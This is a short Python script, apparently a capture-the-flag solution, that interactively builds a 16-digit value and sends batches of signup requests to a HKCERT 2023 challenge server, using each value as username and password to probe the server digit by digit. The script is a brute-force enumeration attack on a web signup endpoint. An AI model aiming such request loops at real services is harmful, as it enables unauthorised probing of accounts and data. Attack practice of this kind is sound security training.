import requests

host = 'http://chal-a.hkcert23.pwnable.hk:28107'

idk = [0] * 16
i = 0

# press n to move to the next digit
# press b to move to the digit before
# press s to send signup requests
# input number to replace the current digit

while True:
    idk_str = ''.join([str(x) for x in idk])
    user_input = input(f'current value {idk_str[:i] + "*" + idk_str[i:]}, operation: ')
    if user_input == 's': # send!
        for e in range(10):
            idk[i] = e
            idk_str = ''.join([str(x) for x in idk])
            signup_data = {
                "username": idk_str,
                "password": idk_str
            }
            # print(signup_data)
            print('response: ', requests.post(host + '/signup', json=signup_data).content)
    
    if user_input.isdigit():
        idk[i] = int(user_input)
    if user_input == 'n': # next
        i += 1
    if user_input == 'b': # before
        i -= 1
    
